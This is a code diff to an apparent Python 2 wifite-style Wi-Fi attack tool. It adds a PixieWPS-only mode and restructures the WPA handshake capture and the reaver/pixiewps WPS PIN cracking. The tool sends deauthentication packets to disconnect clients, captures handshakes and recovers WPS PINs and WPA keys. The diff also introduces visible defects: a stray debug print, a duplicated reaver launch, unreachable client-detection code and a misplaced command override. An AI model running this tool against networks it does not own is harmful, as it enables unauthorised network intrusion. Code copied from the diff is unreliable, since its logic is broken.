@@ -87,11 +87,11 @@ from subprocess import call
 # GLOBAL VARIABLES IN ALL CAPS #
 ################################
 
-REVISION = 85;
+REVISION = 86;
 
 
 # WPA variables
-WPA_DISABLE          = False # Flag to skip WPA handshake capture
+WPA_DISABLE          = False  # Flag to skip WPA handshake capture
 WPA_STRIP_HANDSHAKE  = True  # Use pyrit or tshark (if applicable) to strip handshake
 WPA_DEAUTH_TIMEOUT   = 10    # Time to wait between deauthentication bursts (in seconds)
 WPA_ATTACK_TIMEOUT   = 500   # Total time to allow for a handshake attack (in seconds)
@@ -155,7 +155,10 @@ CRACKED_TARGETS    = []    # List of targets we have already cracked
 ATTACK_ALL_TARGETS = False # Flag for when we want to attack *everyone*
 ATTACK_MIN_POWER   = 0     # Minimum power (dB) for access point to be considered a target
 VERBOSE_APS        = True  # Print access points as they appear
+
+#Pixie variables
 PIXIE_TIMEOUT	   = 660
+PIXIE_ONLY        = False
 
 # Console colors
 W  = '\033[0m'  # white (normal)
@@ -442,7 +445,7 @@ def handle_args():
 	global WEP_CAFFELATTE, WEP_P0841, WEP_HIRTE, WEP_CRACK_AT_IVS, WEP_IGNORE_FAKEAUTH
 	global WEP_SAVE, SHOW_MAC_IN_SCAN, ATTACK_ALL_TARGETS, ATTACK_MIN_POWER
 	global WPS_DISABLE, WPS_TIMEOUT, WPS_RATIO_THRESHOLD, WPS_MAX_RETRIES
-	global VERBOSE_APS, PIXIE_TIMEOUT
+	global VERBOSE_APS, PIXIE_TIMEOUT, PIXIE_ONLY
 
 	args = argv[1:]
 	if args.count('-h') + args.count('--help') + args.count('?') + args.count('-help') > 0:
@@ -650,7 +653,11 @@ def handle_args():
 				except ValueError: print R+' [!]'+O+' invalid timeout: %s' % (R+args[i]+W)
 				except IndexError: print R+' [!]'+O+' no timeout given!'+W
 				else: print GR+' [+]'+W+' pixie attack timeout set to %s' % (G+args[i] + " seconds"+W)
-
+			if args[i] == '-ponly':                                                                                       
+				print GR+' [+]'+W+' Pixiewps attack only '+G+'enabled'+W                                                            
+				PIXIE_ONLY = True                                                                                                      
+				WPA_DISABLE = True                                                                                              
+				WEP_DISABLE = True
 			if args[i] == '-wpsratio' or args[i] == 'wpsr':
 				i += 1
 				try:
@@ -877,7 +884,7 @@ def help():
 	print sw+'\t-wpsretry '+var+'<num>\t'+des+'max number of retries for same PIN before giving up '+de+'[0]'+W
 
 	print head+'\n   PixieWPS'+W
-	print sw+'\t-pixieonly       \t'+des+'only target WPS networks/only use pixiewps       '+de+'[off]'+W
+	print sw+'\t-ponly       \t'+des+'only target WPS networks/only use pixiewps       '+de+'[off]'+W
 	print sw+'\t-pixiet '+var+'<sec>  \t'+des+'max wait pixiewps before giving up (0: never)  '+de+'[660]'+W
 
 
@@ -1824,8 +1831,8 @@ def wpa_get_handshake(iface, target, clients):
 		Returns True if handshake was found, False otherwise
 	"""
 	global TARGETS_REMAINING, WPA_ATTACK_TIMEOUT
-
-	if WPA_ATTACK_TIMEOUT <= 0: WPA_ATTACK_TIMEOUT = -1
+	print PIXIE_ONLY
+	if WPA_ATTACK_TIMEOUT <= 0:WPA_ATTACK_TIMEOUT = -1
 	
 	# Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap
 	save_as = WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
@@ -1843,140 +1850,142 @@ def wpa_get_handshake(iface, target, clients):
 	remove_airodump_files(temp + 'wpa')
 	
 	# Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
-	try:
-		# Start airodump-ng process to capture handshakes
-		cmd = ['airodump-ng', 
-		      '-w', temp + 'wpa', 
-		      '-c', target.channel, 
-		      '--bssid', target.bssid, iface]
-		proc_read = Popen(cmd, stdout=DN, stderr=DN)
-		
-		# Setting deauthentication process here to avoid errors later on
-		proc_deauth = None
-		
-		print ' %s starting %swpa handshake capture%s on "%s"' % \
-		        (GR+sec_to_hms(WPA_ATTACK_TIMEOUT)+W, G, W, G+target.ssid+W)
-		got_handshake = False
-		
-		seconds_running = 0
-		
-		target_clients = clients[:]
-		client_index = -1
-		
-		# Deauth and check-for-handshake loop
-		while not got_handshake and (WPA_ATTACK_TIMEOUT <= 0 or seconds_running < WPA_ATTACK_TIMEOUT):
+
+	if PIXIE_ONLY == False:
+		try:
+			# Start airodump-ng process to capture handshakes
+			cmd = ['airodump-ng', 
+			      '-w', temp + 'wpa', 
+			      '-c', target.channel, 
+			      '--bssid', target.bssid, iface]
+			proc_read = Popen(cmd, stdout=DN, stderr=DN)
 			
-			time.sleep(1)
-			seconds_running += 1
+			# Setting deauthentication process here to avoid errors later on
+			proc_deauth = None
 			
-			print "                                                          \r",
-			print ' %s listening for handshake...\r' % \
-			      (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W),
-			stdout.flush()
+			print ' %s starting %swpa handshake capture%s on "%s"' % \
+			        (GR+sec_to_hms(WPA_ATTACK_TIMEOUT)+W, G, W, G+target.ssid+W)
+			got_handshake = False
 			
-			if seconds_running % WPA_DEAUTH_TIMEOUT == 0: 
-				# Send deauth packets via aireplay-ng
-				cmd = ['aireplay-ng', 
-				      '-0',  # Attack method (Deauthentication)
-				       '1',  # Number of packets to send
-				      '-a', target.bssid]
+			seconds_running = 0
+			
+			target_clients = clients[:]
+			client_index = -1
+			
+			# Deauth and check-for-handshake loop
+			while not got_handshake and (WPA_ATTACK_TIMEOUT <= 0 or seconds_running < WPA_ATTACK_TIMEOUT):
 				
-				client_index += 1
+				time.sleep(1)
+				seconds_running += 1
 				
-				if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
-					print " %s sending 1 deauth to %s*broadcast*%s..." % \
-					         (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W),
-					client_index = -1
-				else:
-					print " %s sending 1 deauth to %s... " % \
-					         (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, \
-					         G+target_clients[client_index].bssid+W),
-					cmd.append('-h')
-					cmd.append(target_clients[client_index].bssid)
-				cmd.append(iface)
+				print "                                                          \r",
+				print ' %s listening for handshake...\r' % \
+				      (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W),
 				stdout.flush()
 				
-				# Send deauth packets via aireplay, wait for them to complete.
-				proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
-				proc_deauth.wait()
-				print "sent\r",
-				stdout.flush()
-			
-			# Copy current dump file for consistency
-			if not os.path.exists(temp + 'wpa-01.cap'): continue
-			copy(temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp')
-			
-			# Save copy of cap file (for debugging)
-			#remove_file('/root/new/wpa-01.cap')
-			#copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')
-			
-			# Check for handshake
-			if has_handshake(target, temp + 'wpa-01.cap.temp'):
-				got_handshake = True
+				if seconds_running % WPA_DEAUTH_TIMEOUT == 0: 
+					# Send deauth packets via aireplay-ng
+					cmd = ['aireplay-ng', 
+					      '-0',  # Attack method (Deauthentication)
+					       '1',  # Number of packets to send
+					      '-a', target.bssid]
+					
+					client_index += 1
+					
+					if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
+						print " %s sending 1 deauth to %s*broadcast*%s..." % \
+						         (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W),
+						client_index = -1
+					else:
+						print " %s sending 1 deauth to %s... " % \
+						         (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, \
+						         G+target_clients[client_index].bssid+W),
+						cmd.append('-h')
+						cmd.append(target_clients[client_index].bssid)
+						cmd.append(iface)
+					stdout.flush()
+					
+					# Send deauth packets via aireplay, wait for them to complete.
+					proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
+					proc_deauth.wait()
+					print "sent\r",
+					stdout.flush()
 				
-				try: os.mkdir(WPA_HANDSHAKE_DIR + os.sep)
-				except OSError: pass
+				# Copy current dump file for consistency
+				if not os.path.exists(temp + 'wpa-01.cap'): continue
+				copy(temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp')
 				
-				# Kill the airodump and aireplay processes
+				# Save copy of cap file (for debugging)
+				#remove_file('/root/new/wpa-01.cap')
+				#copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')
+				
+				# Check for handshake
+				if has_handshake(target, temp + 'wpa-01.cap.temp'):
+					got_handshake = True
+					
+					try: os.mkdir(WPA_HANDSHAKE_DIR + os.sep)
+					except OSError: pass
+					
+					# Kill the airodump and aireplay processes
+					send_interrupt(proc_read)
+					send_interrupt(proc_deauth)
+					
+					# Save a copy of the handshake
+					rename(temp + 'wpa-01.cap.temp', save_as)
+					
+					print '\n %s %shandshake captured%s! saved as "%s"' % (GR+sec_to_hms(seconds_running)+W, G, W, G+save_as+W)
+					WPA_FINDINGS.append('%s (%s) handshake captured' % (target.ssid, target.bssid))
+					WPA_FINDINGS.append('saved as %s' % (save_as))
+					WPA_FINDINGS.append('')
+					
+					# Strip handshake if needed
+					if WPA_STRIP_HANDSHAKE: strip_handshake(save_as)
+					
+					# Add the filename and SSID to the list of 'to-crack'
+					# Cracking will be handled after all attacks are finished.
+					WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))
+						
+					break # Break out of while loop
+						
+				# No handshake yet
+				os.remove(temp + 'wpa-01.cap.temp')
+				
+				# Check the airodump output file for new clients
+				for client in parse_csv(temp + 'wpa-01.csv')[1]:
+						if client.station != target.bssid: continue
+						new_client = True
+						for c in target_clients:
+							if client.bssid == c.bssid: 
+								new_client = False
+						break
+					
+						if new_client:
+							print " %s %snew client%s found: %s                         " % \
+								(GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W, \
+								G+client.bssid+W)
+							target_clients.append(client)
+			
+			# End of Handshake wait loop.
+		
+			if not got_handshake:
+				print R+' [0:00:00]'+O+' unable to capture handshake in time'+W
+	
+		except KeyboardInterrupt: 
+			print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
+			if attack_interrupted_prompt():
+				remove_airodump_files(temp + 'wpa')
 				send_interrupt(proc_read)
 				send_interrupt(proc_deauth)
-				
-				# Save a copy of the handshake
-				rename(temp + 'wpa-01.cap.temp', save_as)
-				
-				print '\n %s %shandshake captured%s! saved as "%s"' % (GR+sec_to_hms(seconds_running)+W, G, W, G+save_as+W)
-				WPA_FINDINGS.append('%s (%s) handshake captured' % (target.ssid, target.bssid))
-				WPA_FINDINGS.append('saved as %s' % (save_as))
-				WPA_FINDINGS.append('')
-				
-				# Strip handshake if needed
-				if WPA_STRIP_HANDSHAKE: strip_handshake(save_as)
-				
-				# Add the filename and SSID to the list of 'to-crack'
-				# Cracking will be handled after all attacks are finished.
-				WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))
-				
-				break # Break out of while loop
-				
-			# No handshake yet
-			os.remove(temp + 'wpa-01.cap.temp')
-			
-			# Check the airodump output file for new clients
-			for client in parse_csv(temp + 'wpa-01.csv')[1]:
-				if client.station != target.bssid: continue
-				new_client = True
-				for c in target_clients:
-					if client.bssid == c.bssid: 
-						new_client = False
-						break
-				
-				if new_client:
-					print " %s %snew client%s found: %s                         " % \
-					       (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W, \
-					       G+client.bssid+W)
-					target_clients.append(client)
-			
-		# End of Handshake wait loop.
-		
-		if not got_handshake:
-			print R+' [0:00:00]'+O+' unable to capture handshake in time'+W
-	
-	except KeyboardInterrupt: 
-		print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
-		if attack_interrupted_prompt():
-			remove_airodump_files(temp + 'wpa')
-			send_interrupt(proc_read)
-			send_interrupt(proc_deauth)
-			print ''
-			exit_gracefully(0)
+				print ''
+				exit_gracefully(0)
 			
 
-	# clean up
-	remove_airodump_files(temp + 'wpa')
-	send_interrupt(proc_read)
-	send_interrupt(proc_deauth)
+		# clean up
+		remove_airodump_files(temp + 'wpa')
+		send_interrupt(proc_read)
+		send_interrupt(proc_deauth)
 	
-	return got_handshake
+		return got_handshake
 
 def has_handshake_tshark(target, capfile):
 	"""
@@ -2855,7 +2864,6 @@ def wps_attack(iface, target):
 	print GR+' [0:00:00]'+W+' initializing %sPixieWPS attack%s on %s' % \
 	             (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
 
-
 	p_start = int(time.time())
 	pixie="false"
 	pixie_exit="false"
@@ -2877,101 +2885,106 @@ def wps_attack(iface, target):
 	ENonceb=""
 
 	p_out = open(temp + "reaver_out.out", "w")
-	
 	#Run reaver to collect hashes
-
 	pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-L", "-a", "-P" ], stdout=p_out).pid
-
 	p = open(temp + "reaver_out.out")
-
 	#Report when each hash is found
 
-	while pixie_exit == "false":
-		while pixie == "false":
-			time.sleep(1)
-			line = p.readline()
-			if "E-Nonce:" in line and ENonceb == "":                                                                                                     
-				print GR+' [+]'+G+' E-Nonce found'                                                                                         
-				ENonceb="1"                                      
-			if "PKE:" in line and PKEb == "":
-				print GR+' [+]'+G+' PKE hash found'
-				PKEb="1"
-       		        if "PKR:" in line and PKRb == "":                 
-       	        	        print GR+' [+]'+G+' PKR hash found'     
-        	                PKRb="1"                                
-			if "AuthKey:" in line and AuthKeyb == "":
-				print GR+' [+]'+G+' Authkey found'
-			AuthKeyb="1"
-			if "E-Hash1" in line and EHash1b == "":
-				print GR+' [+]'+G+' E-Hash1 found'
-				EHash1b="1"
-			if "E-Hash2" in line:
-				os.kill(pid, signal.SIGQUIT)
-				print GR+' [+]'+G+' E-Hash2 found'
-				pixie = "true"
-			if PIXIE_TIMEOUT > 0 and p_run < int(time.time()):
-				print R+'\n [!]'+O+' unable to complete successful try in %d seconds' % (PIXIE_TIMEOUT)
-				print R+' [+]'+W+' skipping pixiewps on %s' % (O+target.ssid+W)
-				WPSpin="WPS pin not found!"
-				pixie_exit="True"
+	try:
+		pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-L", "-a", "-P" ], stdout=p_out).pid
+		p = open(temp + "reaver_out.out")
+		while pixie_exit == "false":
 
-		if pixie == "true":
-			#p = open(temp + "reaver_out.out")
-			line="s"
-			p.seek(0)
-			while line:
-	    
-			    line = p.readline()
-			    if "PKE:" in line:PKE=line
-			    if "PKR:" in line:PKR=line
-			    if "E-Hash1" in line:EHash1=line
-			    if "E-Hash2" in line:EHash2=line
-			    if "AuthKey" in line:AuthKey=line
-			    if "E-Nonce" in line:ENonce=line
-			p.close()
-		
-	
-			ENonce=ENonce[ENonce.find("E-Nonce:")+5:ENonce.find("\n")] 	
-			PKE=PKE[PKE.find("PKE:")+5:PKE.find("\n")]
-			PKR=PKR[PKR.find("PKR:")+5:PKR.find("\n")]	
-			EHash1=EHash1[EHash1.find("EHash1:")+14:EHash1.find("\n")]
-			EHash2=EHash2[EHash2.find("EHash2:")+14:EHash2.find("\n")]
-			AuthKey=AuthKey[AuthKey.find("AuthKey:")+9:AuthKey.find("\n")]
-			
-			
-			PKEb=len(re.sub('[^A-Za-z0-9]+', '', PKE))/2
-			EHash1b=len(re.sub('[^A-Za-z0-9]+', '', EHash1))/2
-			EHash2b=len(re.sub('[^A-Za-z0-9]+', '', EHash2))/2
-			AuthKeyb=len(re.sub('[^A-Za-z0-9]+', '', AuthKey))/2
-	
-			fin2 = open(temp + "fPixiewpsIn.txt", "w")
-			fout2 = open(temp + "fPixiewpsOut.txt", "w")
-			ferr2 = open(temp + "fPixiewpsErrors.txt", "w")
-	
-			#Stuff the hashes into pixiewps	
+			while pixie == "false":
 
-
-			runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", ENonce ],stdin=fin2, stdout=fout2, stderr=ferr2)
-			Popen.wait(runpixie)
-			f = open(temp + 'fPixiewpsOut.txt')
-			line="s"
-			while line:
-				line = f.readline()
-				if "WPS pin:" in line:
-					WPSpin=line
-					print WPSpin
-					pixie_exit="true"
-
-				if "WPS pin not found!" in line:
+				time.sleep(1)
+				line = p.readline()
+				if "E-Nonce:" in line and ENonceb == "":                                                                                                     
+					print GR+' [+]'+G+' E-Nonce found'                                                                                         
+					ENonceb="1"                                      
+				if "PKE:" in line and PKEb == "":
+					print GR+' [+]'+G+' PKE hash found'
+					PKEb="1"
+       			        if "PKR:" in line and PKRb == "":                 
+       		        	        print GR+' [+]'+G+' PKR hash found'     
+       	 	            		PKRb="1"                                
+				if "AuthKey:" in line and AuthKeyb == "":
+					print GR+' [+]'+G+' Authkey found'
+					AuthKeyb="1"
+				if "E-Hash1" in line and EHash1b == "":
+					print GR+' [+]'+G+' E-Hash1 found'
+					EHash1b="1"
+				if "E-Hash2" in line:
+					os.kill(pid, signal.SIGQUIT)
+					print GR+' [+]'+G+' E-Hash2 found'
+					pixie = "true"
+				if PIXIE_TIMEOUT > 0 and p_run < int(time.time()):
+					print R+'\n [!]'+O+' unable to complete successful try in %d seconds' % (PIXIE_TIMEOUT)
+					print R+' [+]'+W+' skipping pixiewps on %s' % (O+target.ssid+W)
 					WPSpin="WPS pin not found!"
-					pixie_exit="exit"
-			f.close()
-			
-			os.remove(temp + "fPixiewpsErrors.txt")
-			os.remove(temp + "fPixiewpsIn.txt")
-			os.remove(temp + "fPixiewpsOut.txt")	
+					pixie_exit="True"	
+
+	except KeyboardInterrupt:
+		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
+		if attack_interrupted_prompt():
+			send_interrupt(proc)
+			print ''
+			exit_gracefully(0)
+
+	if pixie == "true":
+		#p = open(temp + "reaver_out.out")
+		line="s"
+		p.seek(0)
+		while line:
+    
+		    line = p.readline()
+		    if "PKE:" in line:PKE=line
+		    if "PKR:" in line:PKR=line
+		    if "E-Hash1" in line:EHash1=line
+		    if "E-Hash2" in line:EHash2=line
+		    if "AuthKey" in line:AuthKey=line
+		    if "E-Nonce" in line:ENonce=line
+		p.close()
 	
-	if WPSpin=="WPS pin not found!":	#Crap, timed out or didn't work. Run a regular reaver brute-force
+		ENonce=ENonce[ENonce.find("E-Nonce:")+5:ENonce.find("\n")] 	
+		PKE=PKE[PKE.find("PKE:")+5:PKE.find("\n")]
+		PKR=PKR[PKR.find("PKR:")+5:PKR.find("\n")]	
+		EHash1=EHash1[EHash1.find("EHash1:")+14:EHash1.find("\n")]
+		EHash2=EHash2[EHash2.find("EHash2:")+14:EHash2.find("\n")]
+		AuthKey=AuthKey[AuthKey.find("AuthKey:")+9:AuthKey.find("\n")]
+		
+		
+		PKEb=len(re.sub('[^A-Za-z0-9]+', '', PKE))/2
+		EHash1b=len(re.sub('[^A-Za-z0-9]+', '', EHash1))/2
+		EHash2b=len(re.sub('[^A-Za-z0-9]+', '', EHash2))/2
+		AuthKeyb=len(re.sub('[^A-Za-z0-9]+', '', AuthKey))/2
+
+		fin2 = open(temp + "fPixiewpsIn.txt", "w")
+		fout2 = open(temp + "fPixiewpsOut.txt", "w")
+		ferr2 = open(temp + "fPixiewpsErrors.txt", "w")
+
+		#Stuff the hashes into pixiewps	
+
+		runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", ENonce ],stdin=fin2, stdout=fout2, stderr=ferr2)
+		Popen.wait(runpixie)
+		f = open(temp + 'fPixiewpsOut.txt')
+		line="s"
+		while line:
+			line = f.readline()
+			if "WPS pin:" in line:
+				WPSpin=line
+				print WPSpin
+				pixie_exit="true"
+			if "WPS pin not found!" in line:
+				WPSpin="WPS pin not found!"
+				pixie_exit="exit"
+		f.close()
+		
+		os.remove(temp + "fPixiewpsErrors.txt")
+		os.remove(temp + "fPixiewpsIn.txt")
+		os.remove(temp + "fPixiewpsOut.txt")	
+
+	if WPSpin=="WPS pin not found!" or WPSpin=="":	#Crap, timed out or didn't work. Run a regular reaver brute-force
 		print GR+'\n [+]'+G+' Pixiewps attack failed!'
 		cmd = ['reaver',
 			'-i', iface,
@@ -2980,152 +2993,147 @@ def wps_attack(iface, target):
 		        '-a',  # auto-detect best options, auto-resumes sessions, doesn't require input!
 		        '-c', target.channel,
 		        '-vv']  # verbose output
-
-
+		
 	else:
 		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]	#pixiewps found a pin, let's see if it works! Have to remove the -a flag, or it hangs. 
 		print GR+'\n [+]'+G+' PIN found:     %s' % (C+WPSpin+W)
 		print GR+' [+]'+G+' Handing pin to reaver'
-		cmd = ['reaver',
-			'-i', iface,
-		       	'-b', target.bssid,
-		       	'-o', temp + 'out.out', # Dump output to file to be monitored
-		        '--pin', WPSpin, # Try pin found by pixiewps
-		        '-c', target.channel,
-		        '-vv']  # verbose output
+	cmd = ['reaver',
+		'-i', iface,
+	       	'-b', target.bssid,
+	       	'-o', temp + 'out.out', # Dump output to file to be monitored
+	        '--pin', WPSpin, # Try pin found by pixiewps
+	        '-c', target.channel,
+	        '-vv']  # verbose output
 	
 	#####/PIXIEWPS#####
+	if PIXIE_ONLY == False:
+		print GR+'\n [0:00:00]'+W+' initializing %sWPS PIN attack%s on %s' % \
+		             (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
 
-	print GR+'\n [0:00:00]'+W+' initializing %sWPS PIN attack%s on %s' % \
-	             (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
+		proc = Popen(cmd, stdout=DN, stderr=DN)
+		cracked = False   # Flag for when password/pin is found
+		percent = 'x.xx%' # Percentage complete
+		aps     = 'x'     # Seconds per attempt
+		time_started = time.time()
+		last_success = time_started # Time of last successful attempt
+		last_pin = ''     # Keep track of last pin tried (to detect retries)
+		retries  = 0      # Number of times we have attempted this PIN
+		tries_total = 0      # Number of times we have attempted all pins
+		tries    = 0      # Number of successful attempts
+		pin = ''
+		key = ''
 	
-
-	proc = Popen(cmd, stdout=DN, stderr=DN)
+		try:
+			while not cracked:
+				time.sleep(1)
+				if proc.poll() != None:
+					# Process stopped: Cracked? Failed? 
+					inf = open(temp + 'out.out', 'r')
+					lines = inf.read().split('\n')
+					inf.close()
+					for line in lines:
 	
-	cracked = False   # Flag for when password/pin is found
-	percent = 'x.xx%' # Percentage complete
-	aps     = 'x'     # Seconds per attempt
-	time_started = time.time()
-	last_success = time_started # Time of last successful attempt
-	last_pin = ''     # Keep track of last pin tried (to detect retries)
-	retries  = 0      # Number of times we have attempted this PIN
-	tries_total = 0      # Number of times we have attempted all pins
-	tries    = 0      # Number of successful attempts
-	pin = ''
-	key = ''
+						# When it's cracked:
+						if line.find("WPS PIN: '") != -1:
+							pin = line[line.find("WPS PIN: '") + 10:-1]
+						if line.find("WPA PSK: '") != -1:
+							key = line[line.find("WPA PSK: '") + 10:-1]
+							cracked = True
+					break
 	
-	try:
-		while not cracked:
-			time.sleep(1)
-			
-			if proc.poll() != None:
-				# Process stopped: Cracked? Failed? 
+				if not os.path.exists(temp + 'out.out'): continue
+				
 				inf = open(temp + 'out.out', 'r')
 				lines = inf.read().split('\n')
 				inf.close()
+				
 				for line in lines:
-
-
-					# When it's cracked:
-					if line.find("WPS PIN: '") != -1:
+					if line.strip() == '': continue
+					# Status
+					if line.find(' complete @ ') != -1 and len(line) > 8:
+						percent = line.split(' ')[1]
+						i = line.find(' (')
+						j = line.find(' seconds/', i)
+						if i != -1 and j != -1: aps = line[i+2:j]
+					# PIN attempt
+					elif line.find(' Trying pin ') != -1:
+						pin = line.strip().split(' ')[-1]
+						if pin == last_pin: 
+							retries += 1
+						elif tries_total == 0:
+							last_pin = pin
+							tries_total -= 1
+						else:
+							last_success = time.time()
+							tries += 1
+							last_pin = pin
+							retries = 0
+						tries_total += 1
+						
+					# Warning
+					elif line.endswith('10 failed connections in a row'): pass
+					
+					# Check for PIN/PSK
+					elif line.find("WPS PIN: '") != -1:
 						pin = line[line.find("WPS PIN: '") + 10:-1]
-					if line.find("WPA PSK: '") != -1:
+					elif line.find("WPA PSK: '") != -1:
 						key = line[line.find("WPA PSK: '") + 10:-1]
 						cracked = True
-				break
-
-			if not os.path.exists(temp + 'out.out'): continue
-			
-			inf = open(temp + 'out.out', 'r')
-			lines = inf.read().split('\n')
-			inf.close()
-			
-			for line in lines:
-				if line.strip() == '': continue
-				# Status
-				if line.find(' complete @ ') != -1 and len(line) > 8:
-					percent = line.split(' ')[1]
-					i = line.find(' (')
-					j = line.find(' seconds/', i)
-					if i != -1 and j != -1: aps = line[i+2:j]
-				# PIN attempt
-				elif line.find(' Trying pin ') != -1:
-					pin = line.strip().split(' ')[-1]
-					if pin == last_pin: 
-						retries += 1
-					elif tries_total == 0:
-						last_pin = pin
-						tries_total -= 1
-					else:
-						last_success = time.time()
-						tries += 1
-						last_pin = pin
-						retries = 0
-					tries_total += 1
+					if cracked: break
+				
+				print ' %s WPS attack, %s success/ttl,' % \
+										(GR+sec_to_hms(time.time()-time_started)+W, \
+										G+str(tries)+W+'/'+O+str(tries_total)+W),
+				
+				if percent == 'x.xx%' and aps == 'x': print '\r',
+				else:
+					print '%s complete (%s sec/att)   \r' % (G+percent+W, G+aps+W),
+				
+				
+				if WPS_TIMEOUT > 0 and (time.time() - last_success) > WPS_TIMEOUT:
+					print R+'\n [!]'+O+' unable to complete successful try in %d seconds' % (WPS_TIMEOUT)
+					print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
+					break
+				
+				if WPS_MAX_RETRIES > 0 and retries > WPS_MAX_RETRIES:
+					print R+'\n [!]'+O+' unable to complete successful try in %d retries' % (WPS_MAX_RETRIES)
+					print R+' [+]'+O+' the access point may have WPS-locking enabled, or is too far away'+W
+					print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
+					break
 					
-				# Warning
-				elif line.endswith('10 failed connections in a row'): pass
-				
-				# Check for PIN/PSK
-				elif line.find("WPS PIN: '") != -1:
-					pin = line[line.find("WPS PIN: '") + 10:-1]
-				elif line.find("WPA PSK: '") != -1:
-					key = line[line.find("WPA PSK: '") + 10:-1]
-					cracked = True
-				if cracked: break
+				if WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (float(tries) / tries_total) < WPS_RATIO_THRESHOLD:
+					print R+'\n [!]'+O+' successful/total attempts ratio was too low (< %.2f)' % (WPS_RATIO_THRESHOLD)
+					print R+' [+]'+W+' skipping %s' % (G+target.ssid+W)
+					break
+						
+				stdout.flush()
+				# Clear out output file if bigger than 1mb
+				inf = open(temp + 'out.out', 'w')
+				inf.close()
 			
-			print ' %s WPS attack, %s success/ttl,' % \
-									(GR+sec_to_hms(time.time()-time_started)+W, \
-									G+str(tries)+W+'/'+O+str(tries_total)+W),
+				# End of big "while not cracked" loop
 			
-			if percent == 'x.xx%' and aps == 'x': print '\r',
-			else:
-				print '%s complete (%s sec/att)   \r' % (G+percent+W, G+aps+W),
+				if cracked:
+					if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
+					if key != '': print GR+' [+] %sWPA key found:%s %s' % (G, W, C+key+W)
+					WPA_FINDINGS.append(W+"found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, C+pin+W))
+					WPA_FINDINGS.append('')
+					
+					save_cracked(target.bssid, target.ssid, "Key is '" + key + "' and PIN is '" + pin + "'", 'WPA')
 			
-			
-			if WPS_TIMEOUT > 0 and (time.time() - last_success) > WPS_TIMEOUT:
-				print R+'\n [!]'+O+' unable to complete successful try in %d seconds' % (WPS_TIMEOUT)
-				print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
-				break
-			
-			if WPS_MAX_RETRIES > 0 and retries > WPS_MAX_RETRIES:
-				print R+'\n [!]'+O+' unable to complete successful try in %d retries' % (WPS_MAX_RETRIES)
-				print R+' [+]'+O+' the access point may have WPS-locking enabled, or is too far away'+W
-				print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
-				break
-				
-			if WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (float(tries) / tries_total) < WPS_RATIO_THRESHOLD:
-				print R+'\n [!]'+O+' successful/total attempts ratio was too low (< %.2f)' % (WPS_RATIO_THRESHOLD)
-				print R+' [+]'+W+' skipping %s' % (G+target.ssid+W)
-				break
-				
-			stdout.flush()
-			# Clear out output file if bigger than 1mb
-			inf = open(temp + 'out.out', 'w')
-			inf.close()
-		
-		# End of big "while not cracked" loop
-		
-		if cracked:
-			if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
-			if key != '': print GR+' [+] %sWPA key found:%s %s' % (G, W, C+key+W)
-			WPA_FINDINGS.append(W+"found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, C+pin+W))
-			WPA_FINDINGS.append('')
-			
-			save_cracked(target.bssid, target.ssid, "Key is '" + key + "' and PIN is '" + pin + "'", 'WPA')
-		
-	except KeyboardInterrupt:
-		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
-		if attack_interrupted_prompt():
-			send_interrupt(proc)
-			print ''
-			exit_gracefully(0)
+		except KeyboardInterrupt:
+			print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
+			if attack_interrupted_prompt():
+				send_interrupt(proc)
+				print ''
+				exit_gracefully(0)
 	
-	send_interrupt(proc)
+		send_interrupt(proc)
+		
+		return cracked
 	
-	return cracked
-
-
+	
 
 #c = CapFile('hs/KillfuckSoulshitter_C0-C1-C0-07-54-DC_2.cap', 'Killfuck Soulshitter', 'c0:c1:c0:07:54:dc')
 #WPA_CRACKER = 'aircrack'
@@ -3137,7 +3145,12 @@ if __name__ == '__main__':
 	try:
 		banner()
 		main()
